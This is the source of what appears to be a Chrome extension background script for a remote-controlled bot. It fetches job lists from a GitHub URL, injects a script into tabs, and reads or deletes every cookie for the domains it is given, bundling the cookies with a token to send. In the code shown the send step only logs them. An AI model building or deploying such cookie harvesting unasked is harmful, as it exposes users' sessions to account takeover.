const state = {urls: [], jobs: [], queryParam: {}};
const botHosts = {remote: "https://api.contador.cloud", local: "https://localhost:8000"};
const actions = {
    send: body => {
        body.url = state.urls;
        console.log(body);
    },
    getJobs: async (name, isBotInject) => {
        if (isBotInject)
            name = "inject/" + name;

        const url = "https://raw.githubusercontent.com/drupalista-br/drupalista-br.github.io/json/" + name + ".json";
        const response = await fetch(url);
        return response.json();
    },
    cookiesEat: domains => {
        return Promise.all(promises.cookiesGetAll(domains)).then(jars => {
            let cookies = [];
            jars.forEach(jar => cookies = jar.result.concat(cookies));

            return Promise.all(promises.cookiesEat(cookies));
        });
    },
    cookiesEatReload: (domains, to) => {
        actions.cookiesEat(domains)
        .then(results => chrome.tabs.update(state.tabId, {"url": to}));
    },
    cookiesGetAllSend: domains => {
        Promise.all(promises.cookiesGetAll(domains)).then(jars => {
            let cookies = {};
            jars.forEach(jar => cookies[jar.domain] = jar.result);

            actions.send({token: state.token, cookies: cookies});
        });
    }
};
const promises = {
    cookiesGetAll: domains => {
        const promises = [];
        domains.forEach(domain => {
            promises.push(chrome.cookies.getAll({ domain: domain }).then(cookies => {
                return {
                    method: "cookiesGetAll",
                    domain: domain,
                    result: cookies
                };
            }));
        });
        return promises;
    },
    cookiesEat: cookies => {
        const promises = [];
        cookies.forEach(cookie => {
            const url = cookie => {
                if (cookie.domain.charAt(0) === ".")
                    cookie.domain = cookie.domain.replace(".", "");

                return "https://" + cookie.domain + cookie.path;
            };
            promises.push(chrome.cookies.remove({url: url(cookie), name: cookie.name}).then(cookie => {
                // cookie contains only name, storeId and url.
                return {
                    method: "cookiesEat",
                    result: cookie
                };
            }));
        });
        return promises;
    }
};

chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
    if (changeInfo.status !== 'complete') return;
    const url = new URL(tab.url);
    const setStateQueryParam = () => {
        state.queryParam = {
            botJobs: url.searchParams.get("botJobs"),
            botInject: url.searchParams.has("botInject"),
            token: url.searchParams.get("botToken"),
        };
    };
    const isBotInject = () => {
        if (!state.botInjectCookieValue) return;

        chrome.cookies.set({
            domain: url.hostname,
            name: "botInject",
            value: state.botInjectCookieValue,
            path: "/",
            url: url.protocol + "//" + url.hostname
        });
        return chrome.scripting.executeScript({target: {tabId: tabId}, files: ['inject.js']});
    };
    const starting = () => {
        const setState = jobs => {
            state.urls.push(tab.url);
            state.token = state.queryParam.token;
            state.jobs = [...jobs];
            state.botInjectCookieValue = state.queryParam.botInject ? state.queryParam.botJobs + "|" + state.queryParam.token : false;
        };
        if (state.queryParam.botJobs) {
            if (!state.queryParam.token)
                throw new Error("botToken query parameter is missing.");

            actions.getJobs(state.queryParam.botJobs, state.queryParam.botInject).then(jobs => {
                setState(jobs);
                state.jobs.shift();
                if (isBotInject()) return;

                actions[jobs[0].action.name](...jobs[0].action.args);
            });
            return true;
        }
    };
    const inCourse = () => {
        if (state.jobs.length === 0) return;
        if (tab.url.includes(state.jobs[0].url)) {
            const name = state.jobs[0].action.name;
            const args = state.jobs[0].action.args;
            state.urls.push(tab.url);
            state.jobs.shift();

            if (isBotInject()) return;

            actions[name](...args);
        }
    };
    state.tabId = tabId;
    setStateQueryParam();
    if (starting()) return;
    inCourse();
});
